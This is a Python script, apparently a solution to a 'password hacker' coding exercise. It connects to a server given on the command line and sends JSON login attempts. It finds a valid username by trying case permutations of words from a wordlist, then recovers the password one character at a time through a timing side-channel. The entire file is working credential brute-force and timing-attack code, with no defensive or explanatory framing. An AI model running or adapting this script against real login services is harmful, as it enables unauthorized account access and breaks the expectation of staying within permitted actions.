from socket import socket
from sys import argv
from itertools import product
from datetime import datetime
import json


class Hack:
    abc = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

    def __init__(self):
        self.hostname = argv[1]
        self.port = int(argv[2])
        with socket() as client_socket:
            client_socket.connect((self.hostname, self.port))
            print(self.password_hack(client_socket))

    def login_hack(self, client: socket):
        with open('logins.txt', 'r') as file:
            for line in file:
                login = line.strip('\n')
                for item in product(*([[letter.lower(), letter.upper()] for letter in login])):
                    login = ''.join(item)
                    json_data = json.dumps({'login': login, 'password': ' '})
                    client.send(json_data.encode())
                    response = json.loads(client.recv(1024).decode())
                    if response == {"result": "Wrong password!"}:
                        return login

    def password_hack(self, client: socket):
        login = self.login_hack(client)
        password = ''
        while True:
            for character in self.abc:
                temp = password + character
                start_time = datetime.now()
                client.send(json.dumps({"login": login, "password": temp}).encode())
                response = json.loads(client.recv(1024).decode())
                finish_time = datetime.now()
                if (finish_time - start_time).microseconds >= 90000:
                    password = temp
                if response == {"result": "Connection success!"}:
                    password = temp
                    return json.dumps({"login": login, "password": password})


Hack()
